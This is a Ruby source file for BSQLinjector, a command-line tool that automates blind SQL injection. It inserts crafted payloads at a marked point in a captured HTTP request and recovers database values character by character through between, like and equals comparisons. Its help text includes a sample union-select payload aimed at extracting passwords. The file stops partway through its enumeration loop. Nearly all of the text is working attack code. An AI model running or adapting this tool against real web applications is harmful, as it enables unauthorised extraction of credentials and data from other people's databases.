#!/usr/bin/env ruby

require 'uri'
require 'net/http'
require 'net/https'

# CONFIGURE
$file = "" # file with vulnerable HTTP request
$secfile = "" # file with second request (2nd order)
$prepend = "" # most of SQL statement
$append = "" # how to end SQL statement

$proto = "http" # protocol to use - http/https
$proxy = "" # proxy host
$proxy_port = "" # proxy port

$mode = "b" # mode to use (between - b (default - this mode generates less requests), moreless - a (this mode generates less requests by comparing characters using \"<\", \">\", \"=\" characters), like - l (complete bruteforce with like), equals - e (complete bruteforce with =))
$hex = "n" # if hex should be used in comparing

$max = 1000; # maximum chars to enumerate
$search = ""; # what is the pattern to look for when query is TRUE

$comma = "n" # if comma should be URL encoded
$oh = "" # this character is used when opening string when comparing
$bracket = ")" # substring ending brackets
$case = "n" # setting case sensitivity

$verbose = "n" # verbose messaging
$test = "n" # test mode
timeout = 20 # timeout for receiving responses
alls = "n" # if all special characters should be included in enumeration

$i = 0 # main counter for characters

# set all variables
ARGV.each do |arg|
	$file = arg.split("=")[1] if arg.include?("--file=")
	$proto = "https" if arg.include?("--ssl")
	$proxy = arg.split("=")[1].split(":")[0] if arg.include?("--proxy=")
	$proxy_port = arg.split("=")[1].split(":")[1] if arg.include?("--proxy=")
	$verbose = "y" if arg.include?("--verbose")
	timeout = Integer(arg.split("=")[1]) if arg.include?("--timeout=")
	$comma = "y" if arg.include?("--comma")
	$secfile = arg.split("=")[1] if arg.include?("--2ndfile=")
	$max = arg.split("=")[1].to_i if arg.include?("--max=")
	$mode = arg.split("=")[1] if arg.include?("--mode=")
	$hex = "y" if arg.include?("--hex")
	$oh = arg.split("=")[1] if arg.include?("--schar=")
	$case = "y" if arg.include?("--case")
	$i = arg.split("=")[1].to_i - 1 if arg.include?("--start=")
	$test = "y" if arg.include?("--test")
	$bracket = arg.split("=")[1] if arg.include?("--bracket=")
	alls = "y" if arg.include?("--special")

	$search = arg.split("=")[1] if arg.include?("--pattern=") && arg.count("=") == 1
	$prepend = arg.split("=")[1] if arg.include?("--prepend=") && arg.count("=") == 1
	$append = arg.split("=")[1] if arg.include?("--append=") && arg.count("=") == 1
	$search = arg.split("=")[1..-1].join("=") if arg.include?("--pattern=") && arg.count("=") > 1
	$prepend = arg.split("=")[1..-1].join("=") if arg.include?("--prepend=") && arg.count("=") > 1
	$append = arg.split("=")[1..-1].join("=") if arg.include?("--append=") && arg.count("=") > 1
end

# show main menu
if ARGV.nil? || ARGV.size < 3 || $file == "" || ($search == "" && $test == "n")
	puts "BSQLinjector by Jakub Pa\u0142aczy\u0144ski"
	puts ""
	puts "BSQLinjector uses blind method to retrieve data from SQL databases."
	puts ""
	puts "Options:"
	puts "  --file	Mandatory - File containing valid HTTP request and SQL injection point (SQLINJECT). (--file=/tmp/req.txt)"
	puts "  --pattern	Mandatory - Pattern to look for when query is true. (--pattern=truestatement)"
	puts "  --prepend	Mandatory - Main payload. (--prepend=\"abcd\'and\'a\'=\'b\'+union+select+\'truestatement\'+from+table+where+col%3d\'value\'+and+substr(password,\""
	puts "  --append	How to end our payload. For example comment out rest of SQL statement. (--append=\'#)"
	puts "  --2ndfile	File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)"
	puts ""
	puts "  --mode	Blind mode to use - (between - b (generates less requests), moreless - a (generates less requests by using \"<\", \">\", \"=\" characters), like - l (complete bruteforce), equals - e (complete bruteforce)). (--mode=l)"
	puts "  --hex		Use hex to compare instead of characters."
	puts "  --case	Case sensitivity."
	puts ""
	puts "  --ssl		Use SSL."
	puts "  --proxy	Proxy to use. (--proxy=127.0.0.1:8080)"
	puts ""
	puts "  --test	Enable test mode. Do not send request, just show full payload."
	puts "  --comma	Encode comma."
	puts "  --bracket	Add brackets to the end of substring function. --bracket=\"))\""
	puts "  --schar	Character placed around chars. This character is not used while in hex mode. (--schar=\"\'\")"
	puts "  --special	Include all special characters in enumeration."
	puts "  --start	Start enumeration from specified character. (--start=10)"
	puts "  --max		Maximum characters to enumerate. (--max=10)"
	puts "  --timeout	Timeout in waiting for responses. (--timeout=20)"
	puts "  --verbose	Show verbose messages."
	puts ""
	puts "Example usage:"
	puts "  ruby #{__FILE__} --pattern=truestatement --file=/tmp/req.txt --prepend=\"abcd\'and\'a\'=\'b\'+union+select+\'truestatement\'+from+table+where+col%3d\'value\'+and+substr(password,\" --append=\"\'#\" --ssl"
	puts ""
	exit(1)
else
	puts "BSQLinjector by Jakub Pa\u0142aczy\u0144ski"
	puts ""
end

# EXECUTION

# holds HTTP responses
$response = ""

# arrays for Blind exploitation
$arrs = [",", "_", "."]
if alls == "y"
	$arrs += ["+", "/", ":", "-", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "~", "`", "[", "]", "{", "}", ";", "<", ">", "?", "|", "\\", "\""]
end
$arrn1 = ["0", "1", "2", "3", "4"]
$arrn2 = ["5", "6", "7", "8", "9"]
$arr1 = ["a", "b", "c"]
$arr2 = ["d", "e", "f"]
$arr3 = ["g", "h", "i"]
$arr4 = ["j", "k", "l", "m"]
$arr5 = ["n", "o", "p"]
$arr6 = ["q", "r", "s"]
$arr7 = ["t", "u", "v"]
$arr8 = ["w", "x", "y", "z"]

# for case sensitive
$arr9 = ["A", "B", "C"]
$arr10 = ["D", "E", "F"]
$arr11 = ["G", "H", "I"]
$arr12 = ["J", "K", "L", "M"]
$arr13 = ["N", "O", "P"]
$arr14 = ["Q", "R", "S"]
$arr15 = ["T", "U", "V"]
$arr16 = ["W", "X", "Y", "Z"]

$arrays = $arr1 + $arr2 + $arr3 + $arr4 + $arr5 + $arr6 + $arr7 + $arr8 + $arrn1 + $arrn2 + $arrs
$arraysc = $arr1 + $arr2 + $arr3 + $arr4 + $arr5 + $arr6 + $arr7 + $arr8 + $arr9 + $arr10 + $arr11 + $arr12 + $arr13 + $arr14 + $arr15 + $arr16 + $arrn1 + $arrn2 + $arrs

# other parameters
$result = ""

### Processing Request File ###

# Configure basic options

# set proxy
if $proxy == ""
	$proxy = nil
	$proxy_port = nil
end

if $hex == "y"
	$oh = ""
end

# get connection host and port
z = 1
loop do
    begin
	    break if File.readlines($file)[z].chomp.empty?
    rescue
        break
    end
	if File.readlines($file)[z].include?("Host: ")
		$remote = File.readlines($file)[z].split(" ")[1]
		if $proto == "http"
			$port = 80
		else
			$port = 443
		end
		if $remote.include?(":")
			$port = $remote.split(":")[1]
			$remote = $remote.split(":")[0]
		end
	end
	z = z + 1
end

# Configure main request
def configreq(chars)

	# test mode
	if $test == "y"
		puts "Payload example:"
		if $comma == "y"
			puts $prepend + $i.to_s + "%2C1" + $bracket + chars.sub("%", "%25").sub("&", "%26").sub("+", "%2B").sub(";", "%3B").sub("#", "%23") + $append
		else
			puts $prepend + $i.to_s + ",1" + $bracket + chars.sub("%", "%25").sub("&", "%26").sub("+", "%2B").sub(";", "%3B").sub("#", "%23") + $append
		end
		exit(1)
	end

	found = 0 # for detecting injected payload

	# check HTTP method
	if File.readlines($file)[0].include?("GET ")
		$method = "get"
	else
		$method = "post"
	end

	# get URI path
	$uri = File.readlines($file)[0].split(" ")[1]
	turi = URI.decode($uri).gsub("+", " ")
	if turi.include?("SQLINJECT")
		if $comma == "y"
			$uri = $uri.sub("SQLINJECT", $prepend + $i.to_s + "%2C1" + $bracket + chars.sub("%", "%25").sub("&", "%26").sub("+", "%2B").sub(";", "%3B").sub("#", "%23") + $append)
		else
			$uri = $uri.sub("SQLINJECT", $prepend + $i.to_s + ",1" + $bracket + chars.sub("%", "%25").sub("&", "%26").sub("+", "%2B").sub(";", "%3B").sub("#", "%23") + $append)
		end
		found = found + 1
	end
	
	# get headers
	i = 1
	$headers = Hash.new
	loop do
        begin
		    break if File.readlines($file)[i].chomp.empty?
        rescue
            break
        end
		if !File.readlines($file)[i].include?("Host: ")
			header = File.readlines($file)[i].chomp
			if header.include?("SQLINJECT")
				if $comma == "y"
					header = header.sub("SQLINJECT", $prepend + $i.to_s + "%2C1" + $bracket + chars.sub("%", "%25").sub("&", "%26").sub("+", "%2B").sub(";", "%3B").sub("#", "%23") + $append)
				else
					header = header.sub("SQLINJECT", $prepend + $i.to_s + ",1" + $bracket + chars.sub("%", "%25").sub("&", "%26").sub("+", "%2B").sub(";", "%3B").sub("#", "%23") + $append)
				end
				found = found + 1
			end
			if header.include?("Accept-Encoding")
			else
				$headers[header.split(": ")[0]] = header.split(": ")[1]
			end
		end
		i = i + 1
	end

	# get POST body
	i = i + 1
	$post = ""
	postfind = 0
	if $method == "post"
		loop do
			break if File.readlines($file)[i].nil?
			postline = File.readlines($file)[i]
			tline = postline.gsub("+", " ")
			if tline.include?("SQLINJECT")
				if $comma == "y"
					postline = postline.sub("SQLINJECT", $prepend + $i.to_s + "%2C1" + $bracket + chars.sub("%", "%25").sub("&", "%26").sub("+", "%2B").sub(";", "%3B").sub("#", "%23") + $append)
				else
					postline = postline.sub("SQLINJECT", $prepend + $i.to_s + ",1" + $bracket + chars.sub("%", "%25").sub("&", "%26").sub("+", "%2B").sub(";", "%3B").sub("#", "%23") + $append)
				end
				found = found + 1
			end
			$post += postline
			i = i + 1
		end
	end

	# update Content-Length header
	if $method == "post"
		$headers["Content-Length"] = String($post.bytesize)
	end

	# detect injection point
	if found == 0
		puts "Please specify injection point. Put \"SQLINJECT\" in place where payload should be injected."
		exit(1)
	elsif found > 1
		puts "Multiple instances of injection point found. Please specify only one injection point."
		exit(1)
	end

	# configuring request
	$request = Net::HTTP.new($remote, $port, $proxy, $proxy_port)

	# set HTTPS
	if $proto == "https"
		$request.use_ssl = true
		$request.verify_mode = OpenSSL::SSL::VERIFY_NONE
	end
end

### End of Processing Request File ###

### Configure request for 2nd order case ###
if $secfile != ""

	# check HTTP method
	if File.readlines($secfile)[0].include?("GET ")
		$secmethod = "get"
	else
		$secmethod = "post"
	end

	# get URI path
	$securi = File.readlines($secfile)[0].split(" ")[1]

	# get headers
	y = 1
	$secheaders = Hash.new
	loop do
		break if File.readlines($secfile)[y].chomp.empty?
		if !File.readlines($secfile)[y].include?("Host: ")
			header = File.readlines($secfile)[y].chomp
			if header.include?("Accept-Encoding")
			else
				$secheaders[header.split(": ")[0]] = header.split(": ")[1]
			end
		end
		y = y + 1
	end

	# get POST body
	y = y + 1
	$secpost = ""
	if $method == "post"
		loop do
			break if File.readlines($secfile)[y].nil?
			postline = File.readlines($secfile)[y]
			$secpost += postline
			y = y + 1
		end
	end

	# configuring 2nd request
	$secrequest = Net::HTTP.new($remote, $port, $proxy, $proxy_port)

	# set HTTPS
	if $proto == "https"
		$secrequest.use_ssl = true
		$secrequest.verify_mode = OpenSSL::SSL::VERIFY_NONE
	end
end

### End of Processing 2nd Request File ###

# Sending request
def sendreq()
	
	if $verbose == "y"
		puts "Sending request:"
		if $proto == "http"
			puts "http://#{$remote}:#{$port}#{$uri}"
			puts $headers
			puts "\n"
			puts $post
			puts "\n"
		else
			puts "https://#{$remote}:#{$port}#{$uri}"
			puts $headers
			puts "\n"
			puts $post
			puts "\n"
		end
	end
	
	$response = ""
	$request.start { |r|
		begin
			status = Timeout::timeout($time) {
    				if $method == "post"
					$response = r.post($uri, $post, $headers) 
				else
					$response = r.get($uri, $headers)
				end
  			}
		rescue Timeout::Error
		end
	}
end

# Sending second request
def send2ndreq()
	
	if $verbose == "y"
		puts "Sending second request:"
		if $proto == "http"
			puts "http://#{$remote}:#{$port}#{$securi}"
			puts $secheaders
			puts "\n"
			puts $secpost
			puts "\n"
		else
			puts "https://#{$remote}:#{$port}#{$securi}"
			puts $secheaders
			puts "\n"
			puts $secpost
			puts "\n"
		end
	end
	
	$response = ""
	$secrequest.start { |r|
		begin
			status = Timeout::timeout($time) {
    				if $method == "post"
					$response = r.post($securi, $secpost, $secheaders) 
				else
					$response = r.get($securi, $secheaders)
				end
  			}
		rescue Timeout::Error
		end
	}
end

until $i >= $max  do
	$i = $i + 1
	found = 0
	if ($result == "aaaaa")
        	puts "It seems like your payload gives always true condition. Try another parameter\'s value or different payload.\n";
        	break
        end

	if $mode == "e"
		if $case == "n"
			for ch in $arrays
				if $hex == "y"
					configreq("=" + "0x" + ch.unpack('H*')[0])
				else
					configreq("=" + $oh + ch)
				end
				sendreq()
				send2ndreq() if $secfile != ""
				$fheader = "n"
				$response.to_hash.each { |k,v|
					$fheader = "y" if k.to_s.include?($search)
					$fheader = "y" if v.to_s.include?($search)
				}
				if $response.body.include?($search) || $fheader == "y"
					$result = $result + ch
	    	                    	puts "Letter " + $i.to_s + " found: " + ch
					found = 1
	    	                    	break
				end
			end
		else
			for ch in $arraysc
				if $hex == "y"
					configreq("=" + "0x" + ch.unpack('H*')[0])
				else
					configreq("=" + $oh + ch)
				end
				sendreq()
				send2ndreq() if $secfile != ""
				$fheader = "n"
				$response.to_hash.each { |k,v|
					$fheader = "y" if k.to_s.include?($search)
					$fheader = "y" if v.to_s.include?($search)
				}
				if $response.body.include?($search) || $fheader == "y"
					$result = $result + ch
	    	                    	puts "Letter " + $i.to_s + " found: " + ch
					found = 1
	    	                    	break
				end
			end
		end
	elsif $mode == "l"
		if $case == "n"
			for ch in $arrays
				if ch != "%" && ch != "_"
					if $hex == "y"
						configreq("like" + " " + "0x" + ch.unpack('H*')[0])
					else
						configreq("like" + $oh + ch)
					end
					sendreq()
					send2ndreq() if $secfile != ""
					$fheader = "n"
					$response.to_hash.each { |k,v|
						$fheader = "y" if k.to_s.include?($search)
						$fheader = "y" if v.to_s.include?($search)
					}
					if $response.body.include?($search) || $fheader == "y"
						$result = $result + ch
		    	                    	puts "Letter " + $i.to_s + " found: " + ch
						found = 1
		    	                    	break
					end
				end
			end
		else
			for ch in $arraysc
				if ch != "%" && ch != "_"
					if $hex == "y"
						configreq("like" + " " + "0x" + ch.unpack('H*')[0])
					else
						configreq("like" + $oh + ch)
					end
					sendreq()
					send2ndreq() if $secfile != ""
					$fheader = "n"
					$response.to_hash.each { |k,v|
						$fheader = "y" if k.to_s.include?($search)
						$fheader = "y" if v.to_s.include?($search)
					}
					if $response.body.include?($search) || $fheader == "y"
						$result = $result + ch
		    	                    	puts "Letter " + $i.to_s + " found: " + ch
						found = 1
		    	                    	break
					end
				end
			end
		end

	elsif $mode == "b"

		# lowercase
		if $hex == "y"
			configreq(" between" + " 0x" + "a".unpack('H*')[0] + " and " + "0x" + "z".unpack('H*')[0])
		else
			configreq("between" + $oh + "a" + $oh + "and" + $oh + "z")
		end
		sendreq()
		send2ndreq() if $secfile != ""
		$fheader = "n"
		$response.to_hash.each { |k,v|
			$fheader = "y" if k.to_s.include?($search)
			$fheader = "y" if v.to_s.include?($search)
		}
		if $response.body.include?($search) || $fheader == "y"
			if $hex == "y"
				configreq(" between" + " 0x" + "a".unpack('H*')[0] + " and " + "0x" + "m".unpack('H*')[0])
			else
				configreq("between" + $oh + "a" + $oh + "and" + $oh + "m")
			end
			sendreq()
			send2ndreq() if $secfile != ""
			$fheader = "n"
			$response.to_hash.each { |k,v|
				$fheader = "y" if k.to_s.include?($search)
				$fheader = "y" if v.to_s.include?($search)
			}
			if $response.body.include?($search) || $fheader == "y"
				if $hex == "y"
					configreq(" between" + " 0x" + "a".unpack('H*')[0] + " and " + "0x" + "f".unpack('H*')[0])
				else
					configreq("between" + $oh + "a" + $oh + "and" + $oh + "f")
				end
				sendreq()
				send2ndreq() if $secfile != ""
				$fheader = "n"
				$response.to_hash.each { |k,v|
					$fheader = "y" if k.to_s.include?($search)
					$fheader = "y" if v.to_s.include?($search)
				}
				if $response.body.include?($search) || $fheader == "y"
					if $hex == "y"
						configreq(" between" + " 0x" + "a".unpack('H*')[0] + " and " + "0x" + "c".unpack('H*')[0])
					else
						configreq("between" + $oh + "a" + $oh + "and" + $oh + "c")
					end
					sendreq()
					send2ndreq() if $secfile != ""
					$fheader = "n"
					$response.to_hash.each { |k,v|
						$fheader = "y" if k.to_s.include?($search)
						$fheader = "y" if v.to_s.include?($search)
					}
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr1
							if $hex == "y"
								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
							else
								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					else
						for ch in $arr2
							if $hex == "y"
								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
							else
								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					end
				else
					if $hex == "y"
						configreq(" between" + " 0x" + "g".unpack('H*')[0] + " and " + "0x" + "i".unpack('H*')[0])
					else
						configreq("between" + $oh + "g" + $oh + "and" + $oh + "i")
					end
					sendreq()
					send2ndreq() if $secfile != ""
					$fheader = "n"
					$response.to_hash.each { |k,v|
						$fheader = "y" if k.to_s.include?($search)
						$fheader = "y" if v.to_s.include?($search)
					}
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr3
							if $hex == "y"
								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
							else
								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					else
						for ch in $arr4
							if $hex == "y"
								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
							else
								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					end
				end
			else
				if $hex == "y"
					configreq(" between" + " 0x" + "n".unpack('H*')[0] + " and " + "0x" + "s".unpack('H*')[0])
				else
					configreq("between" + $oh + "n" + $oh + "and" + $oh + "s")
				end
				sendreq()
				send2ndreq() if $secfile != ""
				$fheader = "n"
				$response.to_hash.each { |k,v|
					$fheader = "y" if k.to_s.include?($search)
					$fheader = "y" if v.to_s.include?($search)
				}
				if $response.body.include?($search) || $fheader == "y"
					if $hex == "y"
						configreq(" between" + " 0x" + "n".unpack('H*')[0] + " and " + "0x" + "p".unpack('H*')[0])
					else
						configreq("between" + $oh + "n" + $oh + "and" + $oh + "p")
					end
					sendreq()
					send2ndreq() if $secfile != ""
					$fheader = "n"
					$response.to_hash.each { |k,v|
						$fheader = "y" if k.to_s.include?($search)
						$fheader = "y" if v.to_s.include?($search)
					}
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr5
							if $hex == "y"
								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
							else
								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					else
						for ch in $arr6
							if $hex == "y"
								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
							else
								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					end
				else
					if $hex == "y"
						configreq(" between" + " 0x" + "t".unpack('H*')[0] + " and " + "0x" + "v".unpack('H*')[0])
					else
						configreq("between" + $oh + "t" + $oh + "and" + $oh + "v")
					end
					sendreq()
					send2ndreq() if $secfile != ""
					$fheader = "n"
					$response.to_hash.each { |k,v|
						$fheader = "y" if k.to_s.include?($search)
						$fheader = "y" if v.to_s.include?($search)
					}
					if $response.body.include?($search) || $fheader == "y"
						for ch in $arr7
							if $hex == "y"
								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
							else
								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					else
						for ch in $arr8
							if $hex == "y"
								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
							else
								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
							end
							sendreq()
							send2ndreq() if $secfile != ""
							$fheader = "n"
							$response.to_hash.each { |k,v|
								$fheader = "y" if k.to_s.include?($search)
								$fheader = "y" if v.to_s.include?($search)
							}
							if $response.body.include?($search) || $fheader == "y"
								$result = $result + ch
		    	      			              	puts "Letter " + $i.to_s + " found: " + ch
								found = 1
				   	                    	break
							end
						end
					end
				end
			end
		end

		# uppercase - only when case-sensitive specified
		if $case == "y" && found == 0
			if $hex == "y"
				configreq(" between" + " 0x" + "A".unpack('H*')[0] + " and " + "0x" + "Z".unpack('H*')[0])
			else
				configreq("between" + $oh + "A" + $oh + "and" + $oh + "Z")
			end
			sendreq()
			send2ndreq() if $secfile != ""
			$fheader = "n"
			$response.to_hash.each { |k,v|
				$fheader = "y" if k.to_s.include?($search)
				$fheader = "y" if v.to_s.include?($search)
			}
			if $response.body.include?($search) || $fheader == "y"
				if $hex == "y"
					configreq(" between" + " 0x" + "A".unpack('H*')[0] + " and " + "0x" + "M".unpack('H*')[0])
				else
					configreq("between" + $oh + "A" + $oh + "and" + $oh + "M")
				end
				sendreq()
				send2ndreq() if $secfile != ""
				$fheader = "n"
				$response.to_hash.each { |k,v|
					$fheader = "y" if k.to_s.include?($search)
					$fheader = "y" if v.to_s.include?($search)
				}
				if $response.body.include?($search) || $fheader == "y"
					if $hex == "y"
						configreq(" between" + " 0x" + "A".unpack('H*')[0] + " and " + "0x" + "F".unpack('H*')[0])
					else
						configreq("between" + $oh + "A" + $oh + "and" + $oh + "F")
					end
					sendreq()
					send2ndreq() if $secfile != ""
					$fheader = "n"
					$response.to_hash.each { |k,v|
						$fheader = "y" if k.to_s.include?($search)
						$fheader = "y" if v.to_s.include?($search)
					}
					if $response.body.include?($search) || $fheader == "y"
						if $hex == "y"
							configreq(" between" + " 0x" + "A".unpack('H*')[0] + " and " + "0x" + "C".unpack('H*')[0])
						else
							configreq("between" + $oh + "A" + $oh + "and" + $oh + "C")
						end
						sendreq()
						send2ndreq() if $secfile != ""
						$fheader = "n"
						$response.to_hash.each { |k,v|
							$fheader = "y" if k.to_s.include?($search)
							$fheader = "y" if v.to_s.include?($search)
						}
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr9
								if $hex == "y"
									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
								else
									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						else
							for ch in $arr10
								if $hex == "y"
									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
								else
									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						end
					else
						if $hex == "y"
							configreq(" between" + " 0x" + "G".unpack('H*')[0] + " and " + "0x" + "I".unpack('H*')[0])
						else
							configreq("between" + $oh + "G" + $oh + "and" + $oh + "I")
						end
						sendreq()
						send2ndreq() if $secfile != ""
						$fheader = "n"
						$response.to_hash.each { |k,v|
							$fheader = "y" if k.to_s.include?($search)
							$fheader = "y" if v.to_s.include?($search)
						}
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr11
								if $hex == "y"
									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
								else
									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						else
							for ch in $arr12
								if $hex == "y"
									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
								else
									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						end
					end
				else
					if $hex == "y"
						configreq(" between" + " 0x" + "N".unpack('H*')[0] + " and " + "0x" + "S".unpack('H*')[0])
					else
						configreq("between" + $oh + "N" + $oh + "and" + $oh + "S")
					end
					sendreq()
					send2ndreq() if $secfile != ""
					$fheader = "n"
					$response.to_hash.each { |k,v|
						$fheader = "y" if k.to_s.include?($search)
						$fheader = "y" if v.to_s.include?($search)
					}
					if $response.body.include?($search) || $fheader == "y"
						if $hex == "y"
							configreq(" between" + " 0x" + "N".unpack('H*')[0] + " and " + "0x" + "P".unpack('H*')[0])
						else
							configreq("between" + $oh + "N" + $oh + "and" + $oh + "P")
						end
						sendreq()
						send2ndreq() if $secfile != ""
						$fheader = "n"
						$response.to_hash.each { |k,v|
							$fheader = "y" if k.to_s.include?($search)
							$fheader = "y" if v.to_s.include?($search)
						}
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr13
								if $hex == "y"
									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
								else
									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						else
							for ch in $arr14
								if $hex == "y"
									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
								else
									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
									$fheader = "y" if k.to_s.include?($search)
									$fheader = "y" if v.to_s.include?($search)
								}
								if $response.body.include?($search) || $fheader == "y"
									$result = $result + ch
			    	      			              	puts "Letter " + $i.to_s + " found: " + ch
									found = 1
					   	                    	break
								end
							end
						end
					else
						if $hex == "y"
							configreq(" between" + " 0x" + "T".unpack('H*')[0] + " and " + "0x" + "V".unpack('H*')[0])
						else
							configreq("between" + $oh + "T" + $oh + "and" + $oh + "V")
						end
						sendreq()
						send2ndreq() if $secfile != ""
						$fheader = "n"
						$response.to_hash.each { |k,v|
							$fheader = "y" if k.to_s.include?($search)
							$fheader = "y" if v.to_s.include?($search)
						}
						if $response.body.include?($search) || $fheader == "y"
							for ch in $arr15
								if $hex == "y"
									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
								else
									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
								end
								sendreq()
								send2ndreq() if $secfile != ""
								$fheader = "n"
								$response.to_hash.each { |k,v|
